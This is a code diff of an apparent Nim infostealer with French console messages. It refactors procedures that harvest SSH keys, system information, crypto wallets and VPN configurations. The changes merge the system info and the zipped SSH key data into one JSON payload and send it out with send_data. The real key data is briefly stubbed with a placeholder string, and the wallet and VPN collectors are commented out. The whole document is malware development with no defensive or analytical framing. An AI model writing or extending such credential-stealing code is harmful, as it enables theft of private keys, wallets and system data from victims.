@@ -16,7 +16,7 @@ proc crypto_wallets_manager()=
   else:
     echo "[-] Aucun wallet trouvé"
 
-proc ssh_stealer_manager()=
+proc ssh_stealer_manager():JsonNode=
     echo "[*] Extraction des clés SSH"
     echo repeat("=", 50)
 
@@ -45,16 +45,16 @@ proc ssh_stealer_manager()=
       "files": [
         {
           "filename": "ssh_key",
-          "data": encode(zipData)
+          "data":encode("hello world") #encode(zipData)
         }
       ]
     }
-    send_data(json_data)
+    return json_data
 
 
-proc system_info_manager()=
+proc system_info_manager():JsonNode=
   let info = getSystemInfo()
-  send_data(info)
+  return info
 
 
 proc vpn_stealer_manager()=
@@ -63,9 +63,22 @@ proc vpn_stealer_manager()=
     echo "[+] VPN configs: ", data.len, " bytes"
     writeFile("vpn_test.zip", data)
 
+proc merge(a, b: JsonNode): JsonNode =
+  result = a.copy()
+  for k, v in b.pairs:
+    if k in result and result[k].kind == JObject and v.kind == JObject:
+      result[k] = merge(result[k], v)
+    else:
+      result[k] = v
+
 when isMainModule:
-    
-    crypto_wallets_manager()
-    ssh_stealer_manager()
-    system_info_manager()
-    vpn_stealer_manager()
+  let sys_info = system_info_manager()
+  let ssh_files = ssh_stealer_manager()
+
+
+  let json_payload = merge(sys_info,ssh_files)
+  echo json_payload
+  send_data(json_payload)
+
+  # crypto_wallets_manager()
+  # vpn_stealer_manager()
